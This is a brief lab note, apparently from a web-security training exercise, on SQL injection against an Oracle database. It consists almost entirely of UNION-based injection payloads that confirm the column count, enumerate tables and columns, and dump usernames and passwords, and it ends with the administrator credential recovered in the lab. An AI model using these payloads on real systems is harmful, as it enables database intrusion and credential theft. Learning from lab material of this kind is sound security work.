# 06 Lab: SQL injection attack, listing the database contents on Oracle

```jsx
'+UNION+SELECT+'AA',+'BB'+FROM+dual--
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_OCLMMJ'--
'+UNION+SELECT+USERNAME_BYKKMI,+PASSWORD_PPNOZW+FROM+USERS_OCLMMJ--

USERS_OCLMMJ

administrator
5gz1g76gbcmpjgycii2c
```

![Untitled](06%20Lab%20SQL%20injection%20attack,%20listing%20the%20database%20%2012cfab5460ec8067bf09dd5b6329c460/Untitled.png)

![Untitled](06%20Lab%20SQL%20injection%20attack,%20listing%20the%20database%20%2012cfab5460ec8067bf09dd5b6329c460/Untitled%201.png)

![Untitled](06%20Lab%20SQL%20injection%20attack,%20listing%20the%20database%20%2012cfab5460ec8067bf09dd5b6329c460/Untitled%202.png)